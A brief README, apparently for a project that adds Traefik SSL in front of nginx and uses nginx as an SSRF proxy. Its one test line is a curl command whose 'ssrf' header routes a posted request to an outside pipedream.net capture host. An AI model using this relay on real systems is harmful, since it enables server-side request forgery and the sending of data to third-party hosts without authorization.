# traefik-ssl-nginx-ssrf
quick add ssl to nginx(or any other conainer), and use nginx do SSRF stuff

test
```
curl -k  'https://127.0.0.1/' -d '{"key1":"value1", "key2":"value2"}' -H 'ssrf:https://xx.m.pipedream.net/ssrf?p=test'
```
